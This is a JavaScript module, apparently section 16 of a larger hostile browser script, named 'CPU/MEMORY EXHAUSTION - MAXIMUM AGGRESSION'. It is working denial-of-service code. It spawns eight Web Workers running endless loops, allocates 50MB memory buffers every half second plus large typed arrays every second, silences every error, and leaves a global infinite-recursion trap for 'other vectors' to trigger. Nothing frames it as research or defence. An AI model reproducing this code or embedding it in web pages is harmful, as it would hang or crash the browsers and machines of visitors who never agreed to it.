/**
 * 16. CPU/MEMORY EXHAUSTION - MAXIMUM AGGRESSION
 * Web Workers + massive arrays to slow/kill browser
 */
const CPUExhaustion = {
    workers: [],
    init: function() {
        this.spawnWorkers();
        this.allocateMemory();
        this.infiniteRecursionTrap();
    },
    spawnWorkers: function() {
        const workerCode = `
            while(true) {
                Math.random();
                Math.sqrt(Math.random() * 1000000);
                for(let i=0;i<1000000;i++){}
            }
        `;
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        // Spawn 8 workers (one per core typically)
        for (let i = 0; i < 8; i++) {
            try {
                const worker = new Worker(url);
                this.workers.push(worker);
            } catch(e) {}
        }
    },
    allocateMemory: function() {
        const arrays = [];
        const allocate = () => {
            try {
                // Allocate 50MB chunks
                arrays.push(new ArrayBuffer(50 * 1024 * 1024));
                setTimeout(allocate, 500);
            } catch(e) {}
        };
        allocate();
        // Also allocate typed arrays
        setInterval(() => {
            try {
                new Float64Array(10000000);
            } catch(e) {}
        }, 1000);
    },
    infiniteRecursionTrap: function() {
        // Create a function that will cause stack overflow if called
        window.infiniteRecursion = function() {
            return infiniteRecursion();
        };
        // Don't call it directly (would crash immediately), but make it available
        // to be triggered by other vectors or user interaction
    }
};